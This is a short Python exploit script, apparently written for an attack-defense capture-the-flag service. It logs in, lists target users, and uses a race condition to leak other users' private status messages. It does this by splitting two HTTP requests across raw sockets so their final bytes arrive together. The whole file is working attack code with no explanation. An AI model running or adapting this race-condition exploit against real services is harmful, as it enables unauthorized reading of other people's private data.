import string

import requests

try:
	from exploits.common import *
except ImportError:
	from common import *


def random_str(min_chars=10, max_chars=20):
	return ''.join(random.choice(string.printable) for _ in range(random.randint(min_chars, max_chars)))


def attack_rc_share(target: str):
	session = requests.session()
	username = login(session, target)
	interesting_visitors = get_interesting_visitors(session, target)

	for visitor in interesting_visitors:
		print('--- {} ---'.format(username))
		# access our status message
		request1 = build_get_request(target, "/api/statusmessage/" + username, cookies=session.cookies.get_dict())
		# replace our status message with victim's statusmessage
		request2 = build_post_request(target, "/api/statusmessage/spread/" + visitor, cookies=session.cookies.get_dict())

		# try up to 5 times
		for i in range(5):
			# non-public message
			session.post("http://{}/api/statusmessage/set".format(target),
						 json={'title': random_str(), 'text': random_str(20, 40), 'isPublic': False})

			s1 = get_socket_to_host(target)
			s2 = get_socket_to_host(target)
			s1.sendall(request1[:-1])
			s2.sendall(request2[:-1])
			s1.sendall(request1[-1:])
			s2.sendall(request2[-1:])
			result = summarizeHttpAnswer(receive_all_and_close(s1))
			print('>>>>>', result, '<<<<<\n')
			receive_all_and_close(s2)
			if json.dumps(visitor) in result or result.endswith('{}'):
				break


if __name__ == '__main__':
	attack_rc_share(default_target())
